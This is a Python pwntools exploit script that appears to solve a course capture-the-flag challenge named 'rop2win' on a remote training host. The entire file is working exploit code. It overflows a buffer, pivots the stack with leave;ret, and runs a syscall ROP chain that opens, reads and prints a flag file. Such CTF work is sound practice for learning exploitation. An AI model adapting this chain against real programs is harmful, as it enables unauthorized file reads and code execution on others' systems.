#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote("edu-ctf.zoolab.org", 30204)
# r = process("./rop2win")

# r = gdb.debug("./rop2win", """
# b *0x42cea4
# c
# """)

fn_addr = 0x4DF460
ROP_addr = 0x4DF360

open_addr = 0x45FA50
read_addr = 0x45FB80
write_addr = 0x45FC20

pop_rdi_ret = 0x40186a
pop_rsi_ret = 0x4028a8
pop_rax_ret = 0x4607e7
pop_rdx_ret = 0x40176f
syscall_ret = 0x42cea4
leave_ret = 0x401ebd

ROP = p64(0xdeadbeef)

"""
construct ROP:
int fd = open("/home/got2win/flag", 0);
read(3, flag, 0x20);
write(1, flag, 0x20);

0x000000000040186a : pop rdi ; ret

0x00000000004028a8 : pop rsi ; ret

0x000000000040176f : pop rdx ; ret

0x00000000004607e7 : pop rax ; ret

0x000000000042cea4 : syscall ; ret
"""


ROP += flat(
    pop_rdi_ret, fn_addr,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,

    pop_rdi_ret, 3,
    pop_rsi_ret, fn_addr,
    pop_rdx_ret, 0x20,
    pop_rax_ret, 0,
    syscall_ret,

    pop_rdi_ret, 1,
    pop_rsi_ret, fn_addr,
    pop_rdx_ret, 0x20,
    pop_rax_ret, 1,
    syscall_ret,
)

r.sendafter("Give me filename: ", b"/home/rop2win/flag\x00")
r.sendafter("Give me ROP: ", ROP)
r.sendafter("Give me overflow: ", b'A'*0x20 + p64(ROP_addr) + p64(leave_ret))

# gdb.attach(r)

r.interactive()